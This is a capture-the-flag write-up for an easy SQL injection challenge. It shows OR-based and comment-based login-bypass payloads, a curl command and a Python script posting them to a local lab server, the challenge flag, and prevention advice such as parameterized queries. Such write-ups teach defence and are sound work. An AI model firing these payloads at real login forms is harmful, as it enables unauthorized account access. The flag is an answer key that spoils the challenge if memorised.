# SQL Injection 101 - Writeup

## Challenge Info

- **Category**: Web
- **Difficulty**: Easy
- **Points**: 100
- **Flag**: `FLAG{sql_1nj3ct10n_1s_d4ng3r0us}`

## Analysis

### 1. Reconnaissance

Opening the website shows a simple login form with username and password fields.

### 2. Identify the Vulnerability

Testing with a single quote in the username field:

```
Username: admin'
Password: test
```

Results in an error or unexpected behavior - indicating SQL injection vulnerability.

### 3. Understand the Query

The backend likely uses a query like:

```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{input}'
```

## Exploitation

### Method 1: OR-based Bypass

```
Username: admin' OR '1'='1
Password: anything
```

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always true, authentication is bypassed.

### Method 2: Comment-based Bypass

```
Username: admin'--
Password: (leave empty)
```

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

Everything after `--` is commented out.

### Method 3: Using curl

```bash
curl -X POST http://localhost:8080/login \
  -d "username=admin' OR '1'='1" \
  -d "password=x" \
  -L
```

### Method 4: Python Script

```python
import requests

url = "http://localhost:8080/login"
data = {
    "username": "admin' OR '1'='1",
    "password": "x"
}

response = requests.post(url, data=data)
print(response.text)
```

## Flag

```
FLAG{sql_1nj3ct10n_1s_d4ng3r0us}
```

## Prevention

1. **Use Parameterized Queries**
   ```python
   cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
   ```

2. **Use ORM (Object-Relational Mapping)**
   ```python
   User.query.filter_by(username=username, password=password).first()
   ```

3. **Input Validation**
   - Whitelist allowed characters
   - Escape special characters

4. **Least Privilege**
   - Database user should have minimal permissions

## Lessons Learned

1. Never concatenate user input directly into SQL queries
2. Always use parameterized queries or prepared statements
3. Implement proper input validation
4. Use Web Application Firewalls (WAF) as defense in depth
